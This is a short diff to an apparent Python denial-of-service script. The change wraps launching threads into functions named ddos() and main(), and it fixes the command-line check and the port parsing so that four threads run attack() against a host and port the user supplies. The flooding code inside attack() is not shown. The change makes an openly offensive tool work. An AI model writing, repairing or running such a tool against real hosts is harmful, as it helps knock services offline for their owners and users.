@@ -15,12 +15,19 @@ def attack(host, port):
     sock.close()
     return
 
-if len(sys.argv) != 2:
-    sys.exit(1)
-host = sys.argv[1]
-port = sys.argv[2]
-threads = []
-for i in range(4):
-    t = threading.Thread(target=attack, args = (host, port,))
-    threads.append(t)
-    t.start()
+def ddos(host, port):
+    threads = []
+    for i in range(4):
+        t = threading.Thread(target=attack, args = (host, port,))
+        threads.append(t)
+        t.start()
+
+def main():
+    if len(sys.argv) != 3:
+        sys.exit(1)
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    ddos(host, port)
+
+if __name__ == '__main__':
+    main();
